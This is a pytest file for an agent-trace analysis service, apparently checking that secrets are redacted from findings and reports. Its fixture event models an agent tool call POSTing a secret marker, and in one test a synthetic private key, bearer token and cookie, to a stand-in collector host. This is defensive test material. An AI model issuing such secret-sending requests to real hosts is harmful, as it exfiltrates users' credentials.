"""End-to-end sanitization boundary tests; every credential is synthetic."""
import hashlib
import html
import json
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from agenttrace.api import app
from agenttrace.redaction import Redactor

client = TestClient(app)
ROOT = Path(__file__).resolve().parents[2]
MARKER = "AGENTTRACE_SYNTHETIC_SECRET_001"


def event(index=1, tool="http.request", arguments=None):
    return {"schema_version": "1.0", "trace_id": "synthetic-public", "event_id": f"e{index}",
            "call_id": f"c{index}", "timestamp": "2026-10-18T10:00:00Z", "type": "tool_call", "tool": tool,
            "arguments": arguments or {"method": "POST", "url": "https://collector.invalid/upload", "body": MARKER}}


def analyze(*events, policy="baseline"):
    raw = ("\n".join(json.dumps(item) for item in events) + "\n").encode()
    response = client.post(f"/api/analyze?policy={policy}", content=raw)
    assert response.status_code == 200
    return response.json(), raw


def test_api_exports_same_sanitized_evidence_and_real_fingerprints():
    result, raw = analyze(event())
    reports = result["reports"]
    doc = json.loads(reports["json"])
    assert result["source_sha256"] == hashlib.sha256(raw).hexdigest()
    assert reports["report_sha256"] == hashlib.sha256(reports["json"].encode()).hexdigest()
    assert doc["findings"] == result["findings"]
    assert doc["comparison"] == result["comparison"]
    assert MARKER not in json.dumps(result)
    assert MARKER not in html.unescape(reports["markdown"])
    assert doc["findings"][0]["rule_id"] == "R004"
    assert "[REDACTED:" in doc["findings"][0]["evidence_items"][1]["value"]
    assert "arguments" not in doc["event_index"][0]
    assert "output" not in doc["event_index"][0]
    again, _ = analyze(event(), policy="strict")
    assert again["reports"] == reports


def test_full_api_secondary_fields_and_distinct_sensitive_ids():
    events = [event(i, tool="custom." + MARKER, arguments={"password": "synthetic-password-value", "copy": "synthetic-password-value"}) for i in (1, 2)]
    for index, item in enumerate(events):
        item["event_id"] = f"event-{MARKER}-{index}"
        item["call_id"] = f"call-{MARKER}-{index}"
    result, _ = analyze(*events)
    assert MARKER not in json.dumps(result)
    assert "synthetic-password-value" not in json.dumps(result)
    ids = [item["event_id"] for item in result["events"]]
    assert len(set(ids)) == 2
    assert [d["event_id"] for d in result["comparison"]["strict"]["decisions"]] == ids
    assert [w["event_ids"][0] for w in result["warnings"]] == ids
    assert result["comparison"]["strict"]["decisions"][1]["blocked_by_event_id"] == ids[0]


@pytest.mark.parametrize("secret", ["review", "policy", "event_id", "1.0", 123456, True, 1.5])
def test_sensitive_values_cannot_destroy_generated_structure(secret):
    result, _ = analyze(event(tool="custom.test", arguments={"password": secret, "nested": {"password": [secret]}}))
    payload = result["events"][0]["arguments"]
    assert isinstance(payload["password"], str) and payload["password"].startswith("[REDACTED:")
    assert payload["nested"]["password"][0] == payload["password"]
    assert result["schema_version"] == "1.0"
    assert result["comparison"]["baseline"]["decisions"][0]["decision"] == "review"


@pytest.mark.parametrize("value", [123456, True, 1.5])
def test_numeric_sensitive_values_are_redacted_in_generic_api(value):
    redactor = Redactor()
    result = redactor.sanitize({"password": value, "copy": str(value)})
    assert result["password"] == result["copy"]
    assert isinstance(result["password"], str) and "[REDACTED:" in result["password"]


def test_private_blocks_and_authorization_cookie_values_not_in_public_response():
    body = "-----BEGIN PRIVATE KEY-----\nSYNTHETICKEYBODY123456\n-----END PRIVATE KEY-----"
    arguments = {"method": "POST", "url": "https://collector.invalid", "body": body,
                 "headers": {"Authorization": "Bearer SYNTHETIC_AUTH_TOKEN_12345", "Cookie": "session=SYNTHETIC_COOKIE_12345"}}
    result, _ = analyze(event(arguments=arguments))
    encoded = json.dumps(result) + html.unescape(result["reports"]["markdown"])
    for value in ("SYNTHETICKEYBODY123456", "SYNTHETIC_AUTH_TOKEN_12345", "SYNTHETIC_COOKIE_12345", "-----BEGIN PRIVATE KEY-----"):
        assert value not in encoded


def test_all_public_samples_still_produce_reports_and_findings():
    for name, expected in (("benign", []), ("risky", ["R002"]), ("forensic", [f"R{i:03}" for i in range(1, 7)])):
        response = client.post("/api/analyze", content=(ROOT / f"samples/{name}.jsonl").read_bytes())
        assert response.status_code == 200
        result = response.json()
        assert [f["rule_id"] for f in result["findings"]] == expected
        assert result["sanitization"]["version"] == "1.0"
        assert result["reports"]["format_version"] == "1.0"


def test_integrity_warning_missing_reference_refused():
    from agenttrace.engine.analysis import analyze as raw_analyze
    from agenttrace.engine.policy import POLICIES
    from agenttrace.importer import ingest
    from agenttrace.reports import public_analysis

    raw = raw_analyze(ingest((ROOT / "samples/benign.jsonl").read_bytes()), POLICIES["baseline"])
    raw["warnings"] = [{"code": "incomplete_call", "event_ids": ["unknown-event"]}]
    with pytest.raises(ValueError, match="missing evidence reference"):
        public_analysis(raw)
